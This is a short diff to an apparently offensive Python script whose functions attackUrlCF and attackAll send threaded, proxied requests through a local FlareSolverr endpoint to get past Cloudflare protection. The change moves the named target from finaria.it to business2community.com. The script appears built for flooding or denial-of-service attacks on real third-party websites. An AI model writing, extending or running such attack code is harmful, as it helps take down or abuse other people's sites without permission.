@@ -108,7 +108,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 			# checkIp()
 			print(proxies, headers)
-			print(requests.get('http://www.xhaus.com/headers', proxies=proxies).content)
+			print(requests.get('http://www.xhaus.com/headers', proxies=proxies))
 			
 			# print(requests.get('http://myhttpheader.com/' , headers=headers, proxies=proxies).content)
 			# input()
@@ -146,7 +146,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://www.finaria.it', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
 
